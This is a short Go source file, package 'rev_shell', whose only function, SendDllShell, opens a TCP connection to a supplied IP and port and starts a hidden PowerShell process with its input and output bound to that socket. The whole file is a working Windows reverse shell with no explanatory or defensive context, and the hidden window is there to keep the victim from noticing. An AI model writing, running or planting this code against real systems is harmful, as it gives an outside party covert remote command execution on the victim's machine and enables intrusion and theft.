package rev_shell

import (
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

func SendDllShell(ip string, port int) {
	target := fmt.Sprintf("%s:%d", ip, port)
	con, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	var cmd *exec.Cmd
	cmd = exec.Command("powershell")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}
